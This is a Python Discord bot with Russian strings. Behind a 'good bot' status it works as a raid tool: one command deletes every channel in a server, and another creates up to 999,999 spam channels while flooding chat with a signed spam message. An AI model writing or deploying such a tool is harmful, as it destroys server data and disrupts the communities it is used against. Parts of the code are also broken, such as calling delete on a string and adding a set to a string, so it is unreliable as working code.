import discord
from discord.ext import commands
from config import settings
import asyncio

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix = settings['prefix'],  intents = intents)
bot.remove_command('help')


@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Game("Хороший бот"))
    print("Готов всех джага-джага")


@bot.command()
async def help(ctx):
    PREFIX = 's!'
    emb1 = discord.Embed(color = discord.Colour.from_rgb(102, 0, 204), title ="Информация о командах" )

    emb1.add_field(name = f"{PREFIX}delete : ", value="Удалить ", inline=False)
    emb1.add_field(name = f"{PREFIX}spam_server : ", value="Заспамить сервер", inline=True)

    message = await ctx.send(embed = emb1)
                    

@bot.command()
async def delete(ctx, n):
    if n != "0":
        channel = n

        await channel.delete()
    else:
        for c in ctx.guild.channels:
            await c.delete()


@bot.command()
async def spam_server(ctx, n):
    spam_line = "Вы были заспамлены! By illia841"
    spam_text = ""
    for i in range(15):
        spam_text += {spam_line} + "\n"
    
    if n == '0':
        for line in range(0 , 999999):
            guild = ctx.message.guild
            await guild.create_text_channel('сервер-заспамлен')
            await ctx.channel.send(spam_text)
    else:        
        for line in range(0 , int(n)):
            guild = ctx.message.guild
            await guild.create_text_channel('сервер-заспамлен')
            await ctx.channel.send(spam_text)


@bot.command()
async def stop(ctx):
    await bot.change_presence(status=discord.Status.offline)
    raise SystemExit
bot.run(settings['token'])